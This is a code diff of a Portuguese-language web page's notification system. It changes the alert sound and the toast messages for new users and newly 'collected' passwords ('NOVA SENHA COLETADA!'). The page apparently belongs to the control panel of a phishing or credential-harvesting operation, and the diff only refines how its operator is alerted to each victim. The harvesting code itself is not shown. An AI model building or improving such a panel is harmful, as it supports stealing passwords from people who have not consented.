@@ -1247,25 +1247,21 @@
     }
 <!-- Áudio para notificações -->
 <audio id="notificacaoSom" preload="auto">
-    <source src="https://www.myinstants.com/instant/teste-dinheiro-63187/embed/" type="audio/mpeg">
+    <source src="https://www.soundjay.com/misc/sounds/beep-01a.mp3" type="audio/mpeg">
 </audio>
 
 <script>
-// ========== SISTEMA DE SOM COM MYINSTANTS ==========
+// ========== SISTEMA DE SOM PARA NOVOS ACESSOS ==========
 let somLigado = true;
 let ultimoTotalUsuarios = 0;
 let ultimoTotalLogs = 0;
 
-// URL do som que você escolheu (dinheiro)
-const SOM_URL = 'https://www.myinstants.com/media/sounds/teste-dinheiro-63187.mp3';
+const audioSom = document.getElementById('notificacaoSom');
 
 function tocarSom() {
     if (!somLigado) return;
-    
-    // Criar elemento de áudio dinamicamente
-    const audio = new Audio(SOM_URL);
-    audio.volume = 0.7;
-    audio.play().catch(e => console.log('Som não reproduzido:', e));
+    audioSom.currentTime = 0;
+    audioSom.play().catch(e => console.log('Som não reproduzido'));
 }
 
 function alternarSom() {
@@ -1311,11 +1307,11 @@ function verificarNovosDados() {
             
             if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
                 tocarSom();
-                showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+                showToast(`🔔 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
             }
             if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
                 tocarSom();
-                showToast(`💰 NOVA SENHA COLETADA!`, 'info');
+                showToast(`📝 NOVA SENHA COLETADA!`, 'info');
             }
             
             ultimoTotalUsuarios = totalUsuarios;
